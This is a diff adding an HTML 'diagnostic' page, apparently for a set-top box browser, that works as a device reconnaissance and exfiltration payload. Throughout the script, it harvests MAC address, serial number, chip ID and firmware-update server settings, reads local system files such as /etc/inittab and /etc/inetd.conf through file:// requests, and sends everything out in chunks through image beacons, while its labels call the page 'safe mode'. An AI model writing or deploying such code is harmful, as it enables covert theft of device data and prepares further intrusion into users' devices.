@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<title>DIAG v11</title>
+<style type="text/css">
+html,body { margin:0; padding:0; width:1280px; height:720px; overflow:hidden; background:#0b0b0b; color:#ddd; font-family:Arial,Helvetica,sans-serif; font-size:12px; }
+#hdr { padding:6px 10px 0 10px; font-size:18px; color:#7CFC00; }
+#st { padding:0 10px 6px 10px; font-size:13px; color:#7CFC00; }
+.box { background:#000; border:1px solid #333; padding:4px; height:640px; margin:0 10px; overflow-y:auto; }
+.row { border-bottom:1px solid #171717; padding:0; line-height:1.15; white-space:nowrap; overflow:hidden; }
+.k { color:#9ad; }
+.ok { color:#7CFC00; }
+.btn { display:inline-block; margin:4px 8px 4px 0; padding:4px 12px; background:#222; border:1px solid #555; color:#7CFC00; font-size:14px; cursor:pointer; }
+.btn:hover { background:#333; }
+</style>
+</head>
+<body>
+<div id="hdr">DIAG v11 — safe mode (no auto-upgrade)</div>
+<div id="st">booting…</div>
+<div class="box" id="log"></div>
+
+<object type="valups/upgrade" id="upgrade" style="position:absolute;left:0;top:0;width:0;height:0;"></object>
+<object type="valups/system" id="sysinfo" style="position:absolute;left:0;top:0;width:0;height:0;"></object>
+<object type="application/oipfConfiguration" id="oipfcfg" style="position:absolute;left:0;top:0;width:0;height:0;"></object>
+
+<script type="text/javascript">
+var token = String(new Date().getTime()) + "-" + String(Math.floor(Math.random() * 1000000));
+var sent = 0, MAXROWS = 200, Q = [], sending = false;
+
+function esc(s){if(s===null||s===undefined)return "";return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");}
+function setStatus(t){var e=document.getElementById("st");if(e)e.innerHTML=esc(t);}
+
+function add(k,v,cls){
+    var b=document.getElementById("log");
+    if(b.childNodes.length>=MAXROWS){ b.removeChild(b.firstChild); }
+    b.innerHTML += '<div class="row"><span class="k">'+esc(k)+':</span> <span class="'+(cls||'')+'">'+esc(v).substring(0,200)+'</span></div>';
+    b.scrollTop = b.scrollHeight;
+}
+
+function send(k,v){
+    Q.push([k,v]);
+    if(!sending) drainQ();
+}
+function drainQ(){
+    if(Q.length===0){ sending=false; return; }
+    sending=true;
+    var p=Q.shift();
+    try{
+        var im=new Image();
+        im.src="/api/report?token="+encodeURIComponent(token)+"&k="+encodeURIComponent(String(p[0]).substring(0,120))+"&v="+encodeURIComponent(String(p[1]).substring(0,500))+"&n="+(sent++)+"&r="+Math.random();
+    }catch(e){}
+    setTimeout(drainQ, 300);
+}
+
+function probeSys(){
+    var s=document.getElementById("sysinfo");
+    if(!s){ add("sysinfo","plugin not found"); return; }
+    var props=["modelName","systemId","softwareVersion","macAddress","serialNumber",
+               "screenLanguage","usedNetInterface","totalMemory","freeMemory",
+               "loaderVersion","micomVersion","chipId"];
+    for(var i=0;i<props.length;i++){
+        try{
+            var val=s[props[i]];
+            add("sys."+props[i], String(val), "ok");
+            send("sys."+props[i], String(val));
+        }catch(e){ add("sys."+props[i], "ERR:"+e.message); }
+    }
+}
+
+function probeConfig(){
+    var c=document.getElementById("oipfcfg");
+    if(!c||!c.configuration){ add("oipfcfg","no configuration"); return; }
+    var keys=["upgradeUrl","updateUrl","upgradeServer","updateServer",
+              "portalUrl","portalServer","serverUrl","otaUrl","downloadUrl",
+              "firmwareUrl","swUpdateUrl","swupdateUrl"];
+    for(var i=0;i<keys.length;i++){
+        try{
+            var val=c.configuration.getText(keys[i]);
+            if(val!==null && val!==undefined && val!==""){
+                add("cfg."+keys[i], String(val), "ok");
+                send("cfg."+keys[i], String(val));
+            }
+        }catch(e){}
+    }
+    var moreKeys=["STB_ID","SYSTEM_ID","SW_VERSION","HW_VERSION","MODEL_NAME",
+                  "SERIAL","MAC","PORTAL_URL","UPDATE_URL","UPGRADE_URL","OTA_URL",
+                  "SERVER_URL","FW_URL","DOWNLOAD_URL","TFTP_SERVER","FTP_SERVER",
+                  "HTTP_SERVER","NTP_SERVER"];
+    for(var i=0;i<moreKeys.length;i++){
+        try{
+            var val=c.configuration.getText(moreKeys[i]);
+            if(val!==null && val!==undefined && val!==""){
+                add("cfg."+moreKeys[i], String(val), "ok");
+                send("cfg."+moreKeys[i], String(val));
+            }
+        }catch(e){}
+    }
+}
+
+function readFile(path){
+    add("read", path);
+    send("read.start", path);
+    try{
+        var xhr=new XMLHttpRequest();
+        xhr.open("GET","file://"+path,true);
+        xhr.onreadystatechange=function(){
+            if(xhr.readyState===4){
+                if(xhr.responseText && xhr.responseText.length>0 && xhr.responseText.indexOf("network error message")===-1){
+                    var txt=xhr.responseText;
+                    add("file."+path, "len="+txt.length, "ok");
+                    send("file.len."+path, String(txt.length));
+                    var CHUNK=450;
+                    for(var i=0;i*CHUNK<txt.length;i++){
+                        var part=txt.substring(i*CHUNK, (i+1)*CHUNK);
+                        send("file.c"+i+"."+path, part);
+                    }
+                    add("data", txt.substring(0,150), "ok");
+                }else{
+                    add("file."+path, "not found");
+                    send("file.err."+path, "missing_status="+xhr.status);
+                }
+            }
+        };
+        xhr.send(null);
+    }catch(e){
+        add("file.err", e.message);
+        send("file.exc."+path, e.message);
+    }
+}
+
+window.onload = function(){
+    setStatus("DIAG v11 — safe mode, upgrade disabled");
+    send("panel.boot", "v11_diag_safe");
+
+    add("mode", "SAFE — no auto-upgrade calls", "ok");
+    add("---", "--- system info ---");
+    probeSys();
+
+    setTimeout(function(){
+        add("---", "--- config probe ---");
+        probeConfig();
+    }, 2000);
+
+    setTimeout(function(){
+        add("---", "--- reading key files ---");
+        readFile("/proc/version");
+        setTimeout(function(){ readFile("/proc/cmdline"); }, 500);
+        setTimeout(function(){ readFile("/proc/mounts"); }, 1000);
+        setTimeout(function(){ readFile("/etc/inittab"); }, 1500);
+        setTimeout(function(){ readFile("/etc/inetd.conf"); }, 2000);
+        setTimeout(function(){ readFile("/usr/local/bin/start_settop.sh"); }, 2500);
+    }, 5000);
+
+    setTimeout(function(){
+        setStatus("DIAG complete. Waiting. sent="+sent);
+        send("diag.done", "sent="+sent);
+    }, 12000);
+};
+</script>
+</body>
+</html>
